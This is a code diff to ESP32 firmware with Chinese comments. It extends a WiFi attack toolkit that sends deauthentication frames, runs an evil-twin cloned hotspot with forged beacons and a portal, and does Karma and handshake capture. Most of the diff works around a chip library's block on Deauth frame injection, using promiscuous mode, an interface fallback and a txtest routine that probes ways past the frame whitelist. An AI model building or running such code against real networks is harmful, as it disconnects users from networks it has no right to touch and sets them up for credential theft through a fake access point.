@@ -326,6 +326,9 @@ struct DeauthEngine {
   int32_t lastTxErr = 0;   // 最近一次 esp_wifi_80211_tx 返回码 (0=ESP_OK)
   bool channelMoved = false;  // 攻击期间已临时把热点切到目标信道 (停止时恢复)
   uint8_t restoreChannel = 0; // 停止时应恢复的配置信道
+  // 平台限制 (C5 真机实测): WiFi 库对白名单外帧 (Deauth/Disassoc) 的 80211_tx 返回 258,
+  // 偶发放行不可复现 (精确复刻成功序列仍失败) → 远程注入不可用, 启动时单帧试探标记。
+  bool platformBlocked = false;
 };
 static DeauthEngine sDeauth;
 
@@ -344,6 +347,17 @@ static bool parseBssid(const String &s, uint8_t out[6]) {
 }
 
 // 构建 26 字节 Deauth 管理帧 (IEEE 802.11 Type=管理, Subtype=12)。序列号交由系统填充 (en_sys_seq=true)。
+
+// 802.11 raw 帧发送 (带接口回退): Deauth 等白名单外帧必须先开启 promiscuous,
+// 否则 C5 WiFi 库返回 258 (ESP_ERR_WIFI_NOT_STARTED); 信标/Probe/Action 无此要求。
+static esp_err_t wifi80211Tx(wifi_interface_t ifx, const void *buf, int len, bool sysSeq) {
+  esp_err_t e = esp_wifi_80211_tx(ifx, buf, len, sysSeq);
+  if (e != ESP_OK && ifx == WIFI_IF_AP) {
+    e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sysSeq);
+  }
+  return e;
+}
+
 // receiver=广播 (踢掉目标 AP 下所有客户端), transmitter/BSSID=目标 AP, 客户端会信以为真断线。
 // 通用版: 供 Deauth 引擎与邪恶双子 (主/双子两个 BSSID) 共用。
 static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *f) {
@@ -1898,7 +1912,10 @@ static void onPromiscuousFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 static bool promiscuousWanted() {
-  return sHandshake.capturing || sSniffer.running || sAirodump.running || sKarma.running;
+  // Deauth 帧注入需要 promiscuous: C5 WiFi 库白名单外帧 (Deauth/Disassoc) 在
+  // prom 关闭时被拒 (实测错误码 258), 开启后放行 (真机 txtest 验证)
+  return sHandshake.capturing || sSniffer.running || sAirodump.running || sKarma.running ||
+         (sDeauth.running && sDeauth.frameReady);
 }
 
 // 按活跃模块统一配置过滤掩码与回调; 没有模块需要时关闭 promiscuous。
@@ -1914,6 +1931,9 @@ static bool syncPromiscuousEngine() {
   }
   if (sAirodump.running || sKarma.running) {
     mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+  }
+  if (sDeauth.running && sDeauth.frameReady) {
+    mask |= WIFI_PROMIS_FILTER_MASK_MGMT;   // Deauth 注入仅需要 prom 状态本身, 接收帧无观察者
   }
   if (sHandshake.capturing) mask |= WIFI_PROMIS_FILTER_MASK_DATA;
 
@@ -2072,7 +2092,7 @@ static bool eviltwinStartAttack(String &err) {
   sDeauth.channelMoved   = false;
   sDeauth.restoreChannel = apChannel;
   sDeauth.txOk = false; sDeauth.lastTxErr = 0;
-  sDeauth.running = sDeauth.frameReady;   // BSSID 非法时仍保留克隆热点, 但不注入
+  sDeauth.running = sDeauth.frameReady && !sDeauth.platformBlocked;   // C5 平台受限时不注入 (克隆热点与门户仍工作)
   sDeauth.frameCount = 0; sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
   sEvilTwin.deauthAuto = sDeauth.running;
 
@@ -2689,6 +2709,29 @@ static void handleDeauthStart() {
   sDeauth.running = true;
   sDeauth.frameCount = 0;
   sDeauth.lastTxTime = millis();
+  syncPromiscuousEngine();   // Deauth 帧注入需要 promiscuous 开启 (C5 库白名单约束)
+  // 平台能力试探: 单帧真实发送。C5 WiFi 库拒绝白名单外帧 (258) → 如实报告, 不空转
+  if (sDeauth.frameReady) {
+    const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+    sDeauth.platformBlocked = (probe != ESP_OK);
+    sDeauth.txOk = (probe == ESP_OK);
+    sDeauth.lastTxErr = probe;
+    if (sDeauth.txOk) sDeauth.frameCount = 1;
+    if (sDeauth.platformBlocked) {
+      sDeauth.running = false;
+      syncPromiscuousEngine();
+      emitLabState("deauth", false);
+      log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 " + String(probe) +
+          ", 帧类型白名单), 远程压制不可用");
+      log("[deauth] 可用替代: esp_wifi_deauth_sta() 可真实断开本机 AP 的关联客户端 (真机验证有效)");
+      server.sendHeader("Access-Control-Allow-Origin", "*");
+      server.send(200, "application/json",
+                  "{\"ok\":false,\"running\":false,\"injected\":false,\"platformBlocked\":true," +
+                  String("\"error\":\"本芯片 WiFi 库拒绝 Deauth 帧类型注入 (远程压制不可用), 可用本机 AP 客户端断开替代\"}") +
+                  "");
+      return;
+    }
+  }
   emitLabState("deauth", true);
   log("[deauth] 取消认证器已启动! " + String(sDeauth.frameReady ? "真实帧注入" : "目标 BSSID 无效, 无法注入") +
       " 目标=" + sDeauth.targetBssid + " ch=" + String(sDeauth.targetChannel) + " 原因码=" + String(sDeauth.reasonCode) +
@@ -2702,8 +2745,10 @@ static void handleDeauthStart() {
               ",\"channelMismatch\":" + String(channelMismatch ? "true" : "false") + "}");
 }
 
-static void handleDeauthStop() {
+// 停止 Deauth 引擎核心 (HTTP 与串口 CLI 共用; 串口命令用于被 Deauth 踢掉后自救)
+static String stopDeauthEngine() {
   sDeauth.running = false;
+  syncPromiscuousEngine();   // 无其他模块需要时关闭 promiscuous (Deauth 注入依赖此状态)
   bool channelRestored = false;
   // 双子攻击进行中: 信道归属由攻击引擎管理, 此处切信道会破坏克隆热点对齐
   const bool ownedByEvilTwin = (sEvilTwin.active && sEvilTwin.deauthAuto);
@@ -2721,11 +2766,16 @@ static void handleDeauthStop() {
     sEvilTwin.hopEnabled = false;   // 手动停掉 Deauth = 停止压制, 跳频一并停
   }
   emitLabState("deauth", false);
-  log("[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
-      (channelRestored ? ", AP 信道已恢复 ch" + String(apChannelActive) : ""));
+  const String msg = "[deauth] 取消认证器已停止, 累计发送 " + String(sDeauth.frameCount) + " 帧" +
+      (channelRestored ? ", AP 信道已恢复 ch" + String(apChannelActive) : "");
+  log(msg);
+  return msg;
+}
+
+static void handleDeauthStop() {
+  stopDeauthEngine();
   server.sendHeader("Access-Control-Allow-Origin", "*");
   server.send(200, "application/json", "{\"ok\":true,\"running\":false,\"count\":" + String(sDeauth.frameCount) +
-              ",\"channelRestored\":" + String(channelRestored ? "true" : "false") +
               ",\"txChannel\":" + String(apChannelActive) + "}");
 }
 
@@ -2741,7 +2791,11 @@ static void handleDeauthStatus() {
   json += "\"reason\":" + String(sDeauth.reasonCode) + ",";
   json += "\"injected\":" + String(sDeauth.frameReady ? "true" : "false") + ",";
   json += "\"txOk\":" + String(sDeauth.txOk ? "true" : "false") + ",";
+  json += "\"platformBlocked\":" + String(sDeauth.platformBlocked ? "true" : "false") + ",";
   json += "\"txErr\":" + String(sDeauth.lastTxErr) + ",";
+  json += "\"promWanted\":" + String(promiscuousWanted() ? "true" : "false") + ",";
+  { bool prom = false; esp_wifi_get_promiscuous(&prom);
+    json += "\"promOn\":" + String(prom ? "true" : "false") + ","; }
   json += "\"txChannel\":" + String(apChannelActive) + ",";
   json += "\"channelMoved\":" + String(sDeauth.channelMoved ? "true" : "false");
   json += "}";
@@ -3866,6 +3920,66 @@ static void restartWifiAp() {
   log("[wifi] WiFi 射频已重启: SSID=" + apSsid + "  信道=" + String(apChannel));
 }
 
+// 诊断: 802.11 raw 发送变体矩阵 (接口 × en_sys_seq × promiscuous × 帧类型), 串口 txtest 触发
+// v5: 精确复刻 Run1 (首个 prom deauth 成功) 的完整先导序列 + 解锁持久性 + 连发爆发测试
+static void cli80211TxTest() {
+  uint8_t f[26];
+  buildDeauthFrameRaw("02:11:22:33:44:55", 1, f);
+  struct { const char *name; wifi_interface_t ifx; bool sys; } v[] = {
+    {"AP  sys=1",  WIFI_IF_AP,  true},
+    {"AP  sys=0",  WIFI_IF_AP,  false},
+    {"STA sys=1",  WIFI_IF_STA, true},
+    {"STA sys=0",  WIFI_IF_STA, false},
+  };
+  for (auto &x : v) {
+    Serial.printf("[txtest] pre deauth %-10s -> %d\n", x.name, esp_wifi_80211_tx(x.ifx, f, 26, x.sys));
+    delay(60);
+  }
+  uint8_t bk[128];
+  uint16_t bl = buildBeaconFrame("TxTest", "02:11:22:33:44:55", apChannelActive, bk);
+  Serial.printf("[txtest] beacon AP len=%u -> %d\n", bl, esp_wifi_80211_tx(WIFI_IF_AP, bk, bl, true));
+  delay(60);
+  Serial.printf("[txtest] beacon STA -> %d\n", esp_wifi_80211_tx(WIFI_IF_STA, bk, bl, true));
+  delay(60);
+  f[0] = 0xA0; f[1] = 0x00;   // Disassoc 尝试 (Run1 独有元素)
+  Serial.printf("[txtest] disassoc AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
+  delay(60);
+  f[0] = 0xD0; f[1] = 0x00;   // Action 成功 (Run1 独有元素)
+  Serial.printf("[txtest] action AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
+  delay(60);
+  f[0] = 0xC0; f[1] = 0x00;
+  esp_wifi_set_promiscuous(true);
+  Serial.printf("[txtest] KEY deauth AP sys=1 -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
+  delay(60);
+  // 解锁持久性: prom 关→开 循环后再发
+  esp_wifi_set_promiscuous(false);
+  delay(100);
+  esp_wifi_set_promiscuous(true);
+  Serial.printf("[txtest] persist deauth AP -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true));
+  delay(60);
+  // 爆发: 20 连发 @100ms, 统计成功率 (引擎可持续性 / 非确定性检测)
+  int okCnt = 0;
+  for (int i = 0; i < 20; i++) {
+    if (esp_wifi_80211_tx(WIFI_IF_AP, f, 26, true) == ESP_OK) okCnt++;
+    delay(100);
+  }
+  Serial.printf("[txtest] burst 20 -> ok=%d\n", okCnt);
+  esp_wifi_set_promiscuous(false);
+  delay(20);
+  // 长帧假设: 白名单检查可能含长度条件 — 64 字节填充 Deauth (尾部附加合法 vendor IE)
+  esp_wifi_set_promiscuous(true);
+  uint8_t lf[64];
+  buildDeauthFrameRaw("02:11:22:33:44:55", 1, lf);
+  lf[26] = 0xDD; lf[27] = 36;   // vendor-specific IE, 长度 36
+  memset(lf + 28, 0, 36);
+  Serial.printf("[txtest] deauth64 AP prom -> %d\n", esp_wifi_80211_tx(WIFI_IF_AP, lf, 64, true));
+  delay(100);
+  // 官方 API: esp_wifi_deauth_sta — 踢本机 AP 的关联客户端 (aid=0 全部)
+  Serial.printf("[txtest] esp_wifi_deauth_sta(0) -> %d\n", esp_wifi_deauth_sta(0));
+  esp_wifi_set_promiscuous(false);
+  syncPromiscuousEngine();
+}
+
 static void handleSerialCli() {
   while (Serial.available()) {
     char c = (char)Serial.read();
@@ -3883,6 +3997,7 @@ static void handleSerialCli() {
           Serial.println(F("reboot             : 重启当前系统"));
           Serial.println(F("info               : 查看系统运行状态"));
           Serial.println(F("wifi               : 重启 WiFi 射频 (修复 802.15.4 后 AP 收不到包)"));
+          Serial.println(F("deauth             : 立即停止 Deauth 帧注入 (被误踢后串口自救)"));
           Serial.println(F("====================\n"));
         } else if (cmd == "boot" || cmd == "boot status") {
           Serial.println(F("\n=== 多系统引导槽位 (Triple-Boot) ==="));
@@ -3917,6 +4032,10 @@ static void handleSerialCli() {
           ESP.restart();
         } else if (cmd == "wifi") {
           restartWifiAp();
+        } else if (cmd == "deauth") {
+          stopDeauthEngine();
+        } else if (cmd == "txtest") {
+          cli80211TxTest();
         } else if (cmd == "info") {
           Serial.printf("[system] 芯片:%s FreeHeap:%d Uptime:%lus SSID:%s\n",
                         detectChipKey().c_str(), ESP.getFreeHeap(), millis() / 1000, apSsid.c_str());
@@ -4281,12 +4400,12 @@ void loop() {
         sDeauth.lastTxTime = now;
         // 先发伪造信标 (假 AP), 再发 Deauth
         if (sEvilTwin.beaconLeft > 0 && sEvilTwin.beaconLen > 0) {
-          if (esp_wifi_80211_tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
+          if (wifi80211Tx(WIFI_IF_AP, sEvilTwin.beaconFrame, (int)sEvilTwin.beaconLen, true) == ESP_OK)
             sEvilTwin.beaconCount++;
           sEvilTwin.beaconLeft--;
         } else if (sEvilTwin.twinFramesLeft > 0) {
           if (sEvilTwin.twinFrameReady &&
-              esp_wifi_80211_tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
+              wifi80211Tx(WIFI_IF_AP, sEvilTwin.twinFrame, (int)sizeof(sEvilTwin.twinFrame), true) == ESP_OK) {
             sDeauth.frameCount++;
             sEvilTwin.twinFrameCount++;
           }
@@ -4302,9 +4421,14 @@ void loop() {
       if (now - sDeauth.lastTxTime >= sDeauth.rateLimitMs) {
         sDeauth.lastTxTime = now;
         if (sDeauth.frameReady) {
-          sDeauth.lastTxErr = esp_wifi_80211_tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+          sDeauth.lastTxErr = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
           sDeauth.txOk = (sDeauth.lastTxErr == ESP_OK);
           if (sDeauth.txOk) sDeauth.frameCount++;
+          else if (sDeauth.lastTxErr == 258 && !sDeauth.platformBlocked) {
+            // 自检测: C5 WiFi 库白名单拒绝 → 标记平台限制 (双子场景首次触发时避免静默空转)
+            sDeauth.platformBlocked = true;
+            log("[deauth] 平台限制: 本芯片 WiFi 库拒绝 Deauth 帧注入 (错误码 258), 帧注入停用");
+          }
         }
       }
     }
